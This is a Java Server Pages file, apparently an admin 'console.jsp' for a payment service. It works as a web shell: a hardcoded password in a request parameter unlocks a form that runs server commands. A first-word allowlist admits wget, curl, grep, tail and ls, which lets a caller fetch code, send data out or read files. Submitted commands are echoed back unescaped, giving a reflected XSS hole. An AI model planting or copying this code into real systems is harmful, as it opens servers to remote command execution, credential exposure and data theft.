<%@ page language="java" contentType="text/html; charset=UTF-8"
	pageEncoding="UTF-8" import="java.io.BufferedReader"%>
<%@ page import="java.io.InputStreamReader"%>
<%@ page import="java.util.ArrayList"%>
<%@ page import="java.util.HashSet"%>
<%@ page import="java.util.List"%>
<%@ page import="java.util.Set" %>


<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
	<head>
		<meta http-equiv="Content-Type" content="text/html; UTF-8">
		<title></title>
	</head>
	<body>
		<%
			String password = request.getParameter("password");
			if (password == null || !password.equals("paycard1qaz2wsx")) {
				return;
			}

			//param init 参数初始化
			//查看性能指标
			String seetop = request.getParameter("top");
			//代码输入框是否显示
			String commandInput = request.getParameter("commandInput");
			//命令
			String command = request.getParameter("command");

			//允许执行命令初始化
			Set<String> allowCommandSet = new HashSet<String>();
			allowCommandSet.add("grep");
			allowCommandSet.add("top");
			allowCommandSet.add("free");
			allowCommandSet.add("vmstat");
			allowCommandSet.add("tail");
			allowCommandSet.add("wget");
			allowCommandSet.add("curl");
			allowCommandSet.add("ls");

			Runtime run = Runtime.getRuntime();

			//查看性能参数
			if (seetop != null && seetop.equals("1")) {
				out.write("<div><span style='color:#007fcb'>*** BEGIN MEMORY STATISTICS ***</span>");
				out.write("<br/>Free Memory: " + run.freeMemory());
				out.write("<br/>Max Memory: " + run.maxMemory());
				out.write("<br/>Total Memory: " + run.totalMemory());
				out.write("<br/>Available Processors : "
						+ run.availableProcessors());
				out.write("*** END MEMORY STATISTICS ***</div>");

				Process p1 = null;
				Process p2 = null;
				Process p3 = null;
				try {

					p1 = run.exec(" top -b -n 1 ");
					if (p1.waitFor() == 0) { //0 表示命令执行成功;1 表示命令语法错误;2 表示命令执行错误  
						out.write("<div><span style='color:#007fcb'>*** BEGIN TOP STATISTICS ***</span>");
						out.write("<br/><font color='red'><b>[top -b -n 1 ] </font>");
						BufferedReader reader = new BufferedReader(
								new InputStreamReader(p1.getInputStream()));
						String line = "";
						while ((line = reader.readLine()) != null) {
							out.write("<br/>" + line);
						}
						out.write("</div>");
					}
					p2 = run.exec(" free  ");
					if (p2.waitFor() == 0) { //0 表示命令执行成功;1 表示命令语法错误;2 表示命令执行错误  
						out.write("<div><span style='color:#007fcb'>*** BEGIN free STATISTICS ***</span>");
						out.write("<br/><font color='red'><b>[free ] </font>");
						BufferedReader reader = new BufferedReader(
								new InputStreamReader(p2.getInputStream()));
						String line = "";
						while ((line = reader.readLine()) != null) {
							out.write("<br/>" + line);
						}
						out.write("</div>");
					}
					p3 = run.exec(" vmstat ");
					if (p3.waitFor() == 0) { //0 表示命令执行成功;1 表示命令语法错误;2 表示命令执行错误  
						out.write("<div><span style='color:#007fcb'>*** BEGIN vmstat STATISTICS ***</span>");
						out.write("<br/><font color='red'><b>[vmstat] </font>");
						BufferedReader reader = new BufferedReader(
								new InputStreamReader(p3.getInputStream()));
						String line = "";
						while ((line = reader.readLine()) != null) {
							out.write("<br/>" + line);
						}
						out.write("</div>");
					}

				} finally {
					if (p1 != null) {
						if (p1.getInputStream() != null) {
							p1.getInputStream().close();
						}
						if (p1.getErrorStream() != null) {
							p1.getErrorStream().close();
						}
					}
					if (p2 != null) {
						if (p2.getInputStream() != null) {
							p2.getInputStream().close();
						}
						if (p2.getErrorStream() != null) {
							p2.getErrorStream().close();
						}
					}
					if (p3 != null) {
						if (p3.getInputStream() != null) {
							p3.getInputStream().close();
						}
						if (p3.getErrorStream() != null) {
							p3.getErrorStream().close();
						}
					}

				}
			}

			out.write("<div style=\"margin-top:20px\">");
			if (commandInput != null && commandInput.equals("1")) {
				String text =command;
				if(text==null){
					text="";
				}
				out.write("<span style='color:black'><h1>input your command <....>  </h1> </span>");
				String html = "<form action=\"/console.jsp\" method=\"post\"><div><input type=\"hidden\" name=\"password\" value=\"paycard1qaz2wsx\"></input><input type=\"hidden\" name=\"commandInput\" value=\"1\"></input></input><textarea cols=\"150\" rows=\"5\" name=\"command\">"
						+ text
						+ "</textarea></div><input type=\"submit\"></input></form>";
				out.write(html);
			}

			if (command != null&&!command.equals("")) {
				out.write("<span style='margin-top:20px;color:red;'>[command]:"
						+ command + "</span><br/>");
				String[] commands = command.trim().split(" ");
				List<String> commandList = new ArrayList<String>();
				if (commands != null && commands.length > 0) {
					String code = commands[0];
					if (!allowCommandSet.contains(code)) {
						out.write("**************forbidden**************");
						return;
					}
					for (int i = 0; i < commands.length; i++) {
						if (commands[i] != null) {
							commands[i]=commands[i].replace("!", " ");
							if(commands[i].trim().length()>1){
								commandList.add(commands[i].trim());
							}
						}
						out.write(" "+i+" "+commands[i]);
					}
				}
				
				Process p4 = null;
				try {
					p4 = run.exec((String[])commandList.toArray());
					if (p4.waitFor() == 0) { //0 表示命令执行成功;1 表示命令语法错误;2 表示命令执行错误  
						out.write("<span style='color:#007fcb'>*** BEGIN command ***</span>");
						BufferedReader reader = new BufferedReader(
								new InputStreamReader(p4.getInputStream()));
						String line = "";
						while ((line = reader.readLine()) != null) {
							out.write("<br/>" + line);
						}
					} else {
						if (p4.getErrorStream() != null) {
							out.write("<span style='color:#007fcb'>ERROR:状态"
									+ p4.waitFor() + "</span>");
							BufferedReader reader = new BufferedReader(
									new InputStreamReader(p4.getErrorStream()));
							String line = "";
							while ((line = reader.readLine()) != null) {
								out.write("<br/>" + line);
							}
						}
					}
				} finally {
					if (p4 != null) {
						if (p4.getInputStream() != null) {
							p4.getInputStream().close();
						}
						if (p4.getErrorStream() != null) {
							p4.getErrorStream().close();
						}
					}
				}
				
			}
			out.write("</div>");
		%>
	</body>
</html>